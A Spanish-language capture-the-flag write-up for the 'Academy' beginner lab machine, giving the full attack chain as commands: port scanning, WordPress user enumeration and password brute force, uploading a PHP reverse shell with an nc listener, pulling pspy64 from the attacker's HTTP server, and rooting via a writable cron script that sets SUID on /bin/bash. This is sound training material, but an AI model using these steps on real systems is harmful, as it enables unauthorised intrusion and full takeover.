---
layout: single
title: Academy - TheHackersLabs
excerpt: "Maquina Linux ideal para realizar tu primer CTF"
date: 2024-05-21
classes: wide
header:
  teaser: https://pentest4noob.github.io/Writetups/assets/images/logos/logo_thehackerslabs.png
  teaser_home_page: true
categories:
  - TheHackersLabs
tags:
  - linux
  - Principiante
---

<p align="center">
  <img width="250" height="250" src="https://pentest4noob.github.io/Writetups/assets/images/writetup/thehackerslabs/Academy/academy.jpg">
</p>

Esta maquina está clasificada como "Principiante" en la plataforma de [Thehackerlabs](https://thehackerslabs.com/academy/), en este laboratorio vamos a ver técnicas como fuzzing web y una escalada de privilegios a través de tareas cron

## Herramientas

    nmap
    dirsearch
    wpscan
    pspy64

# 1- Enumeración

Comenzamos con la etapa de enumeración para ello vamos a usar la herramienta nmap con los siguientes parámetros

```bash
sudo nmap -p- --open -sS -sC -sV -n -Pn 172.17.0.2 -oN nmap.txt
```

| Parametro | Descripción                        |
| --------- | ---------------------------------- |
| -p-       | Escanear todos los puertos         |
| --open    | Mostrar los puertos abiertos       |
| -sS       | Sondeo de tipo SYN sigiloso        |
| -sV       | Habilita la detección de versiones |
| -n        | Sin resolución de DNS              |
| -Pn       | Omitir el descubrimiento de hosts  |
| -oN       | Formato de salida del archivo      |

Finalizado el escaneo podemos ver que se encuentran 2 puertos abiertos 22 que corresponde al servicio de SSH y el puerto 80 al servicio web Apache

```css
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-20 12:53 -03
Nmap scan report for 192.168.6.36
Host is up (0.00054s latency).
Not shown: 45517 filtered tcp ports (no-response), 20016 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   256 cb:96:e2:96:ae:29:8d:89:da:c0:c6:86:d8:3a:57:12 (ECDSA)
|_  256 8d:8d:c4:c3:5e:ba:f1:2f:ff:1a:d1:97:ef:6a:2f:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 00:0C:29:7B:42:80 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.74 seconds
```

investigo el puerto 80 para ello ingreso en el navegador web `http://192.168.6.36`,esta la pagina por default del servicio apache, por lo tanto voy hacer fuzzing web

![000Academy.png](https://pentest4noob.github.io/Writetups/assets/images/writetup/thehackerslabs/Academy/000Academy.png)

El fuzzing web voy a realizarlo con la herramienta dirsearch

```bash
dirsearch -u http://192.168.6.36 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -x404 -e php,txt,py
```

| parametro | descripcion                                        |
| --------- | -------------------------------------------------- |
| -u        | Url o dirección ip                                 |
| -w        | ruta del diccionario de fuzzing web                |
| -r        | realizar una busqueda recursiva                    |
| -x 404    | excluir la salida con codigo de error 404          |
| -e        | realizar busquedas por extensiones php,txt,py etc. |

```css

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, txt, py | HTTP method: GET | Threads: 25 | Wordlist size: 220545

Output File: /home/sonic/Desktop/Maquinas/TheHackerLabs/Academy/reports/http_192.168.6.36/_24-05-20_14-34-43.txt

Target: http://192.168.6.36/

[14:34:43] Starting:
[14:34:46] 301 -  316B  - /wordpress  ->  http://192.168.6.36/wordpress/
Added to the queue: wordpress/
[14:50:51] 403 -  277B  - /server-status

[15:07:14] Starting: wordpress/
[15:07:23] 301 -  327B  - /wordpress/wp-content  ->  http://192.168.6.36/wordpress/wp-content/
Added to the queue: wordpress/wp-content/
[15:07:42] 301 -  328B  - /wordpress/wp-includes  ->  http://192.168.6.36/wordpress/wp-includes/
Added to the queue: wordpress/wp-includes/
[15:09:40] 301 -  325B  - /wordpress/wp-admin  ->  http://192.168.6.36/wordpress/wp-admin/
Added to the queue: wordpress/wp-admin/
```

Me encuentro que estamos frente a un directorio wordpress, por lo general las paginas de wordpress no suelen verse bien si no se agrega la dirección en el archivo `/etc/hosts` para ello voy a realizar el siguiente procedimiento ingreso a la siguiente url `http://192.168.6.36/wordpress` luego voy a ver el codifo fuente de la página presionando `ctrl +u` puedo observar que la web apunta a la dirección `academy.thl`

![001Academy.png](https://pentest4noob.github.io/Writetups/assets/images/writetup/thehackerslabs/Academy/001Academy.png)

Procedo a configurar el archivo `/etc/hosts`

```bash
nano /etc/hosts
```

agrego la ip `192.168.6.36` indicando que apunte a la dirección academy.thl

![002Academy.png](https://pentest4noob.github.io/Writetups/assets/images/writetup/thehackerslabs/Academy/002Academy.png)

En el fuzzing web se pudo descubrir adicionalmente el directorio `academy.thl/wordpress/wp-admin` el cual sabemos que es una pagina de login para la administración de wordpress, pero no tengo usuario ni contraseña, para ello voy hacer uso de la herramienta wpscan para enumerar el usuario

```bash
wpscan --url http://academy.thl/wordpress --enumerate u,vp
```

| parametro | Descripcion                         |
| --------- | ----------------------------------- |
| --url     | url de la pagina a realizar fuzzing |
| u         | para que intente enumerar usuarios  |
| vp        | para enumerar plugins               |

El escaneo nos arroja un usuario `dylan`

```css
[i] User(s) Identified:

[+] dylan
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://academy.thl/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
```

ahora que tengo el usuario voy a intentar conseguir la contraseña

```bash
wpscan --url http://academy.thl/wordpress --passwords /usr/share/wordlists/rockyou.txt --usernames dylan
```

| parametro   | descripcion                         |
| ----------- | ----------------------------------- |
| --url       | url de la pagina a realizar fuzzing |
| --passwords | path de diccionario de contraseña   |
| -usernames  | usuario                             |

```css
[!] Valid Combinations Found:
 | Username: dylan, Password: password1
```

ya con el usuario y la contraseña es momento de loguearse en el panel de administración de wordpress, luego de iniciar sesión veo que tengo un plugin para subir archivos, voy aprovecharlo para subir un payload

El payload lo voy a crear desde la pagina [revshells](https://www.revshells.com/) con PHP PentestMonkey, guardo el archivo con el nombre pwned.php

![003Academy.png](https://pentest4noob.github.io/Writetups/assets/images/writetup/thehackerslabs/Academy/003Academy.png)

# 2- Intrusión

Procedo a subir el payload con la reversehell en el plugin de wordpress Bit File Manager

![004Academy.png](https://pentest4noob.github.io/Writetups/assets/images/writetup/thehackerslabs/Academy/004Academy.png)

me pongo a la escucha en mi maquina atacante `nc -nlvp 8080` y procedo a ejecutar el payload en la url ingreso `http://academy.thl/wordpress/pwned.php` me devuelve una conexión, ejecuto el comando `whoami` y me devuelve el usuario `www-data` se pudo realizar la intrusión al equipo

![005Academy.png](https://pentest4noob.github.io/Writetups/assets/images/writetup/thehackerslabs/Academy/005Academy.png)

# 3- Tratamiento de la tty

Ya obtuvimos la intrusión pero la consola que nos devuelve puede ser un poco inestable y al presionar `control + c` podemos perder la conexión para ellos voy hacer un tratamiento de la tty con los siguientes comandos

```bash
script /dev/null -c bash
```

presionar ctrl + z

```bash
stty raw -echo; fg
```

luego ejecutar

```bash
reset xterm
```

nota es posible que no muestre en pantalla lo que estamos tecleando

```bash
export TERM=xterm
```

```bash
export SHELL=bash
```

# 4- Escalada de privilegios

ya con la intrusión realizada y una consola mas estable es momento de escalar privilegios para ello en este caso voy a ser uso de la herramienta `pspy64` la descargo y ahora voy a preceder a enviarla a la maquina victima para ello monto un servidor por el puerto 80 en mi maquina atacante

Ejecutar este comando en la maquina atacante, en el directorio donde se guardó el archivo pspy64

```python
python3 -m http.server 80
```

Ahora es momento de descargar el archivo en la maquina victima para ello me voy a directorio /tmp el cual es perfecto para este tipo de acciones

ejecutar el siguiente comando en la maquina victima

```bash
wget 192.168.6.132/pspy64
```

con esto logré subir el archivo en la maquina victima ahora es momento de ejecutarlo, este programa muestra los procesos ejecutados por otros usuario sin necesidad de ser root, veo que se ejecuta un proceso llamado `backup.sh` en el directorio `/opt`

```bash
./pspy64
```

![007Academy.png](https://pentest4noob.github.io/Writetups/assets/images/writetup/thehackerslabs/Academy/007Academy.png)

veo que tengo permisos de escritura en el directorio `/opt` procedo a revisarlo, me fijo que no existe el archivo backup.sh pero hay una tarea que lo ejecuta, por lo tanto voy aprovecharme de la tarea, ya que tengo permisos de escritura en el directorio voy a crear un archivo llamado `backup.sh` para que se ejecute y así poder escalar privilegios

procedo a crear el archivo con permisos SUID con el siguiente comando

```bash
echo 'chmod u+s /bin/bash' >> backup.sh
```

### Explicación del script anterior

Al establecer el bit SUID con `chmod u+s /bin/bash`, cualquier usuario que ejecute `/bin/bash` lo hará con los privilegios del propietario del archivo, que típicamente es el usuario `root`.

le doy permisos de ejecución

```bash
chomod +x backup.sh
```

Esperamos un par de minutos y ejecuto el comando

```bash
bash -p
```

y automáticamente escalamos al usuario root

![008Academy.png](https://pentest4noob.github.io/Writetups/assets/images/writetup/thehackerslabs/Academy/008Academy.png)

ya solo queda ver las flags, para ello hacemos un cat

Flag user

```bash
cat /home/debian/user.txt
```

Flag root

```bash
cat /root/root.txt
```
